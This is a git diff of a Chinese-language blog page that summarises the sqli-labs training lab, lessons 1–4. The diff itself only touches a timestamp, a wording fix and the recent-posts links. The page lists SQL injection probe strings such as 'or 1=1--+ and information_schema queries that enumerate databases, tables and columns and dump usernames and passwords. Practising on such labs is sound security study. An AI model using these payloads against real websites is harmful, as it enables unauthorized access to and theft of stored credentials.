@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/19.png">
 <meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/18.png">
 <meta property="article:published_time" content="2021-01-22T15:57:39.000Z">
-<meta property="article:modified_time" content="2021-02-10T18:44:49.534Z">
+<meta property="article:modified_time" content="2021-02-11T02:20:31.740Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/1.png">
@@ -135,7 +135,7 @@
 <h2>Less-1~4小结</h2>
 
 <p>1.在输入id=1后，可以尝试用<code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>、<code>&quot;)</code>、<code>)</code>、<code>&quot;)</code>、<code>&quot;))</code>来判断用什么字符注入（①有报错：也可以用<code>\</code>来判断，只要看报错语句中<code>\</code>后面是什么，而且更方便；②无报错：先输入前面的字符，一般是不能正常输出，再在后面加上–+，如果可以正常输出，说明可以用该字符注入(即存在注入漏洞)）。<br>2. 常用语句<br>    查库：select schema_name from information_schema.schemata<br>        //从information_schema.schemata查库名（schema_name）<br>    查表：select table_name from information_schema.tables where table_schema=’被查的库的名称’<br>        //从’被查的库的名称’库查表名<br>        //select table_name from information_schema.tables where table_schema=’security’<br>    查列：select column_name from information_schema.columns where table_name=’被查的表的名称’<br>        //从’被查的表的名称’表查列名<br>        //select column_name from information_schema.columns where table_name=’users’<br>    查字段：select 要查的列名1,要查的列名2 from 库名.表名<br>        //分别查列1和列2的字段<br>        //select group_concat(username),group_concat(password) from 库名.表名<br>    查数据：select 要查的列名1,要查的列名2 from 库名.表名 where id=(？)<br>        //从’被查的列的名称’表查id为？的一组数据<br>        //select id,username,password from security.users where id=1</p>
-<p>3.一般用于尝试的语句（求注入字符，–+可以用#替换）<br>    or 1=1–+<br>    ‘or 1=1–+<br>    “or 1=1–+<br>    )or 1=1–+<br>    ‘)or 1=1–+<br>    “) or 1=1–+<br>    “))or 1=1–+<br>以上正常输出时，说明可以注入；<br>    and 1=1–+<br>    and 1=2–+<br>以上前者正常输出，后者既不输出也不报错时，说明可以注入。<br>4.注入<br>    1)注释法（–+可以用#替换）（<em>为求出的注入字符或</em>字符的另一半）<br>    * 构造的语句 –+<br>    2)闭合法<br>    * 构造的语句 and/or <em>1</em>=*1</p>
+<p>3.一般用于尝试的语句（求注入字符，–+可以用#替换）<br>    or 1=1–+<br>    ‘or 1=1–+<br>    “or 1=1–+<br>    )or 1=1–+<br>    ‘)or 1=1–+<br>    “) or 1=1–+<br>    “))or 1=1–+<br>以上正常输出时，说明可以注入；<br>    and 1=1–+<br>    and 1=2–+<br>以上前者正常输出，后者既不输出也不报错时，说明可以注入。<br>4.注入<br>    1)注释法（–+可以用#替换）<br>    * 构造的语句 –+<br>    2)闭合法（<em>为求出的注入字符或</em>字符的另一半）<br>    * 构造的语句 and/or <em>1</em>=*1</p>
 <p>5.常用函数<br>    group_concat(str1,str2,…)————连接一个组的所有字符串，并以逗号分隔每一条数据。</p>
 <p>6.union操作符<br>用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。<br>列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的 列的顺序必须相同。</p>
 <p>7.SQL注入必备知识初级：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41420747/article/details/81773481">https://blog.csdn.net/qq_41420747/article/details/81773481</a></p>
@@ -203,6 +203,10 @@
       <ul>
         
           <li>
+            <a href="/2021/02/11/sql-labs-Less-19/">sql-labs-Less-19</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/10/sql-labs-Less-18/">sql-labs-Less-18</a>
           </li>
         
@@ -216,10 +220,6 @@
         
           <li>
             <a href="/2021/02/06/sql-labs-Less-11~12/">sql-labs-Less-11~12</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/03/sql-labs-Less-9-10/">sql-labs Less-9~10</a>
           </li>
         
       </ul>
